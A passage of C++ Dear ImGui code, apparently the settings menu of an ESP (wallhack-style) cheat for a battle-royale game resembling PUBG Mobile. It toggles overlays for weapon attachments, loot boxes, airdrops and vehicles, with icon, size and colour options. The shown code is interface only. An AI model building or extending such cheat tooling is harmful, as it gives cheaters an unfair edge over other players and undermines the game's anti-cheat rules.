													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Taktik", (float*)&Setting::Esp_Item_Taktik_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Quick Draw", &Setting::Esp_Item_AR_Quick);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_AR_Quick_Icon", &Setting::Esp_Item_AR_Quick_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::ARQuick, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_AR_Quick_TextSize", &Setting::Esp_Item_AR_Quick_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("AR_Quick", (float*)&Setting::Esp_Item_AR_Quick_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Quick Extended", &Setting::Esp_Item_AR_Quick_Extended);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_AR_Quick_Extended_Icon", &Setting::Esp_Item_AR_Quick_Extended_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::ARQExtended, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_AR_Quick_Extended_TextSize", &Setting::Esp_Item_AR_Quick_Extended_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Quick_Extended", (float*)&Setting::Esp_Item_AR_Quick_Extended_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Extended", &Setting::Esp_Item_AR_Extended);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_AR_Extended_Icon", &Setting::Esp_Item_AR_Extended_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::ARExtended, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_AR_Extended_TextSize", &Setting::Esp_Item_AR_Extended_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Extended", (float*)&Setting::Esp_Item_AR_Extended_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("FlashHider", &Setting::Esp_Item_Sniper_FlashHider);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Sniper_FlashHider_Icon", &Setting::Esp_Item_Sniper_FlashHider_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SniperFlashHider, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Sniper_FlashHider_TextSize", &Setting::Esp_Item_Sniper_FlashHider_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Sniper_FlashHider", (float*)&Setting::Esp_Item_Sniper_FlashHider_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SR Suppressor", &Setting::Esp_Item_Sniper_Suppressor);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Sniper_Suppressor_Icon", &Setting::Esp_Item_Sniper_Suppressor_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SniperSuppressor, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Sniper_Suppressor_TextSize", &Setting::Esp_Item_Sniper_Suppressor_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Sniper_Suppressor", (float*)&Setting::Esp_Item_Sniper_Suppressor_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);



													ImGui::TableNextColumn();
													ImGui::Checkbox("Sr Quick_Extended", &Setting::Esp_Item_Sniper_Quick_Extended);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Sniper_Quick_Extended_Icon", &Setting::Esp_Item_Sniper_Quick_Extended_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SniperQExtended, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Sniper_Quick_Extended_TextSize", &Setting::Esp_Item_Sniper_Quick_Extended_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Sniper_Quick Extended", (float*)&Setting::Esp_Item_Sniper_Quick_Extended_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SR Extended", &Setting::Esp_Item_Sniper_Extended);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Sniper_Extended_Icon", &Setting::Esp_Item_Sniper_Extended_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SniperExtended, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Sniper_Extended_TextSize", &Setting::Esp_Item_Sniper_Extended_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Sniper_Extended", (float*)&Setting::Esp_Item_Sniper_Extended_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SR Quick", &Setting::Esp_Item_Sniper_Quick);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Sniper_Quick_Icon", &Setting::Esp_Item_Sniper_Quick_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SniperQuick, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Sniper_Quick_TextSize", &Setting::Esp_Item_Sniper_Quick_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Esp_Item_Sniper_Quick_Color", (float*)&Setting::Esp_Item_Sniper_Quick_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SMG FlashHider", &Setting::Esp_Item_Mid_FlashHider);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_SMG_FlashHider_Icon", &Setting::Esp_Item_Mid_FlashHider_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SMGFlashHider, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_SMG_FlashHider_TextSize", &Setting::Esp_Item_Mid_FlashHider_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Esp_Item_SMG_FlashHider_Color", (float*)&Setting::Esp_Item_Mid_FlashHider_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SMG Suppressor", &Setting::Esp_Item_Mid_Suppressor);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_SMG_Suppressor_Icon", &Setting::Esp_Item_Mid_Suppressor_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SMGSuppressor, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_SMG_Suppressor_TextSize", &Setting::Esp_Item_Mid_Suppressor_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Esp_Item_SMG_Suppressor_Color", (float*)&Setting::Esp_Item_Mid_Suppressor_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SMG Compensator", &Setting::Esp_Item_Mid_Compensator);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_SMG_Compensator_Icon", &Setting::Esp_Item_Mid_Compensator_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SMGCompensator, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_SMG_Compensator_TextSize", &Setting::Esp_Item_Mid_Compensator_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Esp_Item_SMG_Compensator_Color", (float*)&Setting::Esp_Item_Mid_Compensator_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Micro UZI", &Setting::Esp_Item_Micro_UZI);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Micro_UZI_Icon", &Setting::Esp_Item_Micro_UZI_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SMGCompensator, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Micro_UZI_TextSize", &Setting::Esp_Item_Micro_UZI_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Esp_Item_Micro_UZI_Color", (float*)&Setting::Esp_Item_Micro_UZI_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SMG Quick Extended", &Setting::Esp_Item_SMG_Quick_Extended);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_SMG_Quick_Extended_Icon", &Setting::Esp_Item_SMG_Quick_Extended_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SMGQExtended, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Quick_SMG_Extended_TextSize", &Setting::Esp_Item_SMG_Quick_Extended_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("SMG_Quick_Extended", (float*)&Setting::Esp_Item_SMG_Quick_Extended_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SMG Quick", &Setting::Esp_Item_SMG_Quick);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_SMG_Quick_Icon", &Setting::Esp_Item_SMG_Quick_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SMGQuick, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_SMG_Quick_TextSize", &Setting::Esp_Item_SMG_Quick_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("SMG_Quick", (float*)&Setting::Esp_Item_SMG_Quick_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SMG Extended", &Setting::Esp_Item_SMG_Extended);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_SMG_Extended_Icon", &Setting::Esp_Item_SMG_Extended_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SMGExtended, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_SMG_Extended_TextSize", &Setting::Esp_Item_SMG_Extended_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("SMG_Extended", (float*)&Setting::Esp_Item_SMG_Extended_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Boxes"))
											{
												if (ImGui::BeginTable("ITEM_BOXES", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("DeadBox", &Setting::Esp_Item_DeadBox);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_DeadBox_Icon", &Setting::Esp_Item_DeadBox_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::DeadBox, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_DeadBox_TextSize", &Setting::Esp_Item_DeadBox_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("DeadBox", (float*)&Setting::Esp_Item_DeadBox_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("AirDrop", &Setting::Esp_Item_AirDrop);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_AirDrop_Icon", &Setting::Esp_Item_AirDrop_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::AirDrop, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_AirDrop_TextSize", &Setting::Esp_Item_AirDrop_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("AirDrop", (float*)&Setting::Esp_Item_AirDrop_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Other"))
											{
												if (ImGui::BeginTable("ITEM_OTHERS", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("Game Coin", &Setting::Esp_Item_GameCoin);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_GameCoin_Icon", &Setting::Esp_Item_GameCoin_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::GameCoin, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_GameCoin_TextSize", &Setting::Esp_Item_GameCoin_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("GameCoin", (float*)&Setting::Esp_Item_GameCoin_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Gas", &Setting::Esp_Item_Benzin);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_Benzin_Icon", &Setting::Esp_Item_Benzin_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Benzin, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Benzin_TextSize", &Setting::Esp_Item_Benzin_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Benzin", (float*)&Setting::Esp_Item_Benzin_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("CrossBow Quick", &Setting::Esp_Item_CrossBow_Quick);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Esp_Item_CrossBow_Quick_Icon", &Setting::Esp_Item_CrossBow_Quick_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::CrossBow, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_CrossBow_Quick_TextSize", &Setting::Esp_Item_CrossBow_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("CrossBow_Quick", (float*)&Setting::Esp_Item_CrossBow_Quick_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
										}
										ImGui::EndTabBar();

									}
									ImGui::EndChild();
								}
								else if (Settings::EspTab == 4)
								{
									ImGui::SetCursorPos({74, 150 });
									ImGui::Checkbox(" Vehicle Esp", &Setting::Vehicle);
									if (Setting::Vehicle)
									{
										ImGui::SameLine();
										ImGui::Checkbox("Vehicle Icon", &Setting::AllIcons);
										ImGui::SameLine();
										ImGui::Checkbox("Icon Bg", &Setting::Vehicle_Icon_With_BG);
										ImGui::SameLine();
										ImGui::Checkbox("Show Health", &Setting::hp);
										ImGui::SameLine();
										ImGui::Checkbox("Show Fuel", &Setting::feul);
									}
									ImGui::SetCursorPos({74, 180 });

									ImGui::BeginChild("##1", ImVec2(565, 195), true, ImGuiWindowFlags_NoBackground);
									{
										if (ImGui::BeginTable("vahicle", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
										{
											ImGui::TableSetupColumn("Enable");
											ImGui::TableSetupColumn("Icon");
											ImGui::TableSetupColumn("Font Size");
											ImGui::TableSetupColumn("Color");
											ImGui::TableHeadersRow();

											ImGui::TableNextColumn();
											ImGui::Checkbox("Dacia", &Setting::vahicle_Text_item_Dacia);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Dacia_Icon", &Setting::vahicle_Text_item_Dacia_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Dacia, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::PushItemWidth(160);
											ImGui::SliderInt("##vahicle_Text_item_Dacia_TextSize", &Setting::vahicle_Text_item_Dacia_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("##Dacia_Color", (float*)&Setting::vahicle_Text_item_Dacia_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("UAZ", &Setting::vahicle_Text_item_UAZ);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_UAZ_Icon", &Setting::vahicle_Text_item_UAZ_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::UAZ, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::PushItemWidth(160);
											ImGui::SliderInt("##vahicle_Text_item_UAZ_TextSize", &Setting::vahicle_Text_item_UAZ_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("UAZ", (float*)&Setting::vahicle_Text_item_UAZ_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("Buggy", &Setting::vahicle_Text_item_Coupe);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Buggy_Icon", &Setting::vahicle_Text_item_Buggy_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Buggy, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::PushItemWidth(160);
											ImGui::SliderInt("##vahicle_Text_item_Buggy_TextSize", &Setting::vahicle_Text_item_Buggy_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Buggy", (float*)&Setting::vahicle_Text_item_Buggy_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("Coupe", &Setting::vahicle_Text_item_Coupe);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Coupe_Icon", &Setting::vahicle_Text_item_Coupe_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Coupe, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::PushItemWidth(160);
											ImGui::SliderInt("##vahicle_Text_item_Coupe_TextSize", &Setting::vahicle_Text_item_Coupe_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Coupe", (float*)&Setting::vahicle_Text_item_Coupe_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("UTV", &Setting::vahicle_Text_item_UTV);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_UTV_Icon", &Setting::vahicle_Text_item_UTV_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::UTV, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::PushItemWidth(160);
											ImGui::SliderInt("##vahicle_Text_item_UTV_TextSize", &Setting::vahicle_Text_item_UTV_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("UTV", (float*)&Setting::vahicle_Text_item_UTV_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);


											ImGui::TableNextColumn();
											ImGui::Checkbox("BRDM", &Setting::vahicle_Text_item_BRDM);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_BRDM_Icon", &Setting::vahicle_Text_item_BRDM_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::BRDM, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##Esp_Item_BRDM_TextSize", &Setting::vahicle_Text_item_BRDM_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("BRDM", (float*)&Setting::vahicle_Text_item_BRDM_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("Motorcycle", &Setting::vahicle_Text_item_Motorcycle);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Motorcycle_Icon", &Setting::vahicle_Text_item_Motorcycle_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Motorcycle, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_Motorcycle_TextSize", &Setting::vahicle_Text_item_Motorcycle_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Motorcycle", (float*)&Setting::vahicle_Text_item_Motorcycle_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("SnowBike", &Setting::vahicle_Text_item_SnowBike);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_SnowBike_Icon", &Setting::vahicle_Text_item_SnowBike_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::SnowBike, ImVec2(30, 30));

											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_SnowBike_TextSize", &Setting::vahicle_Text_item_SnowBike_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("SnowBike", (float*)&Setting::vahicle_Text_item_SnowBike_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("Sports", &Setting::vahicle_Text_item_Sports);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Sports_Icon", &Setting::vahicle_Text_item_Sports_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Sports, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_Sports_TextSize", &Setting::vahicle_Text_item_Sports_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Sports", (float*)&Setting::vahicle_Text_item_Sports_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("Minibus", &Setting::vahicle_Text_item_Minibus);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Minibus_Icon", &Setting::vahicle_Text_item_Minibus_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Minibus, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_Minibus_TextSize", &Setting::vahicle_Text_item_Minibus_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Minibus", (float*)&Setting::vahicle_Text_item_Minibus_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("Bike", &Setting::vahicle_Text_item_Bike);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Bike_Icon", &Setting::vahicle_Text_item_Bike_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Bike, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_Bike_TextSize", &Setting::vahicle_Text_item_Bike_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Bike", (float*)&Setting::vahicle_Text_item_Bike_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("BigFoot", &Setting::vahicle_Text_item_BigFoot);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_SnowBigFoot_Icon", &Setting::vahicle_Text_item_BigFoot_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::BigFoot, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_BigFoot_TextSize", &Setting::vahicle_Text_item_BigFoot_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("BigFoot", (float*)&Setting::vahicle_Text_item_BigFoot_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);


											ImGui::TableNextColumn();
											ImGui::Checkbox("Aquarail", &Setting::vahicle_Text_item_Aquarail);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Aquarail_Icon", &Setting::vahicle_Text_item_Aquarail_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Aquarail, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_Aquarail_TextSize", &Setting::vahicle_Text_item_Aquarail_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Aquarail", (float*)&Setting::vahicle_Text_item_Aquarail_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("PG117", &Setting::vahicle_Text_item_PG117);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_PG117_Icon", &Setting::vahicle_Text_item_PG117_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::PG117, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_PG117_TextSize", &Setting::vahicle_Text_item_PG117_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("PG117", (float*)&Setting::vahicle_Text_item_PG117_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("Rony", &Setting::vahicle_Text_item_Rony);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Rony_Icon", &Setting::vahicle_Text_item_Rony_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Rony, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_Rony_TextSize", &Setting::vahicle_Text_item_Rony_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Rony", (float*)&Setting::vahicle_Text_item_Rony_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("Plane", &Setting::vahicle_Text_item_Plane);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Plane_Icon", &Setting::vahicle_Text_item_Plane_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Plane, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_Plane_TextSize", &Setting::vahicle_Text_item_Plane_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("Plane", (float*)&Setting::vahicle_Text_item_Plane_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("PickUpTruck", &Setting::vahicle_Text_item_PickUpTruck);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_PickUpTruck_Icon", &Setting::vahicle_Text_item_PickUpTruck_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::PickUpTruck, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_PickUpTruck_TextSize", &Setting::vahicle_Text_item_PickUpTruck_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("PickUpTruck", (float*)&Setting::vahicle_Text_item_PickUpTruck_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("ATV2", &Setting::vahicle_Text_item_ATV2);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_ATV2_Icon", &Setting::vahicle_Text_item_ATV2_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::ATV2, ImVec2(30, 30));
											ImGui::TableNextColumn();
											ImGui::SliderInt("##vahicle_Text_item_ATV_TextSize", &Setting::vahicle_Text_item_ATV2_TextSize, 1, 50);
											ImGui::TableNextColumn();
											ImGui::ColorEdit4("ATV2", (float*)&Setting::vahicle_Text_item_ATV2_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

											ImGui::TableNextColumn();
											ImGui::Checkbox("Tuk", &Setting::vahicle_Text_item_Tuk);
											ImGui::TableNextColumn();
											ImGui::Checkbox("##vahicle_Text_item_Tuk_Icon", &Setting::vahicle_Text_item_Tuk_Icon);
											ImGui::SameLine();
											ImGui::Image(DX11::Tuk, ImVec2(30, 30));
											ImGui::TableNextColumn();
